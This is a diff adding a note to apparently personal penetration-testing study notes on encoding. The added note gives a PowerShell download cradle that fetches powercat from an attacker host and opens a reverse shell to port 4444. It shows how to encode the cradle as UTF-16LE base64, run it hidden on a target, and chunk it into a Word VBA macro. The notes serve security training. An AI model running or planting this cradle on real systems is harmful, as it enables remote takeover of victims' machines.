@@ -66,6 +66,15 @@ When the server decodes **once**, encode **twice**. The `%` itself becomes `%25`
 > ```
 > Common in: PHP filter LFI (`php://filter/convert.base64-encode/...`), encoded payloads, tokens, basic-auth headers.
 
+> [!danger] PowerShell `-enc` needs UTF-16LE, not UTF-8
+> `powershell.exe -enc <base64>` silently fails to run if the base64 was produced with a plain UTF-8 encode — it specifically expects **UTF-16LE**. Encode with `pwsh` on Kali:
+> ```powershell
+> $cmd = "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>:8000/powercat.ps1');powercat -c <LHOST> -p 4444 -e powershell"
+> [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
+> ```
+> Then run it on the target: `powershell.exe -nop -w hidden -enc <BASE64>`
+> 🔗 This is exactly the encode step used to smuggle the PowerCat cradle from the [[🧰 Command Cheat Sheet]] into a VBA macro in [[Leveraging Microsoft Word macros]] — VBA's 255-char literal limit means the resulting base64 blob also has to be chunked (50 chars at a time) and concatenated into a `Dim Str As String` variable rather than pasted as one string.
+
 ---
 
 ## 🅷 HTML Entities (for XSS / output that gets escaped)
